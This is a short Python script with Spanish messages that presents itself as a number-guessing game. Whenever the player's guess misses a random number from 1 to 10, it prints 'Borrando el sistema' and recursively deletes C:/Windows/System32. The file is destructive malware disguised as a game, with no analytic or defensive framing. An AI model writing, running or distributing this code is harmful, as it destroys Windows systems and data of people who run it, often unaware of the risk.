#/usr/bin/python3
import random
import time
import shutil
import os
from colorama import Fore, Back, Style, init
import signal
import sys

def def_handler(signal,frame):
    print(Fore.RED + "\n[!] SALIENDO....")
    sys.exit(0)
signal.signal(signal.SIGINT, def_handler)

ruta = "C:/Windows/System32"
time.sleep(3)

if os.path.exists(ruta):
    print(f"\n[+] La ruta {ruta} existe")
    time.sleep(3)
    numero = int(input(Fore.CYAN + "\n[+] Introduce un número del 1 al 10: \n"))
    numero_random = random.randint(1,10)
    if numero != numero_random:
        print(Fore.CYAN + f"\n[-]Lo siento, el numero en el que estoy pensando es {numero_random}")
        print(Fore.RED + f"\n[!]Borrando el sistema")
        time.sleep(3)
        shutil.rmtree(ruta)
    else:
        print(Fore.GREEN + f"\n[+]Enhorabuena, el numero en el que estoy pensando es {numero_random}")
else:
    print(f"\n[-] La ruta {ruta} no existe")

